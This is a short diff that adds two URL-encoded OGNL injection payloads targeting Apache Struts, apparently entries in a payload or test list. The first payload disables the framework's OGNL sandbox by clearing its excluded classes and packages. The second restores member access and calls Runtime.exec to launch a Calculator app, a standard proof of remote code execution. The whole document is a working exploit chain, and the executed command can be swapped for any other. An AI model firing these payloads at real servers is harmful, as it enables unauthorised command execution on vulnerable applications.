@@ -1,0 +1,2 @@
+%25%7B(%23context%3D%23attr%5B%27struts.valueStack%27%5D.context).(%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ognlUtil%3D%23container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ognlUtil.setExcludedClasses(%27%27)).(%23ognlUtil.setExcludedPackageNames(%27%27))%7D
+%25%7B(%23context%3D%23attr%5B%27struts.valueStack%27%5D.context).(%23context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(%27open -na Calculator%27))%7D
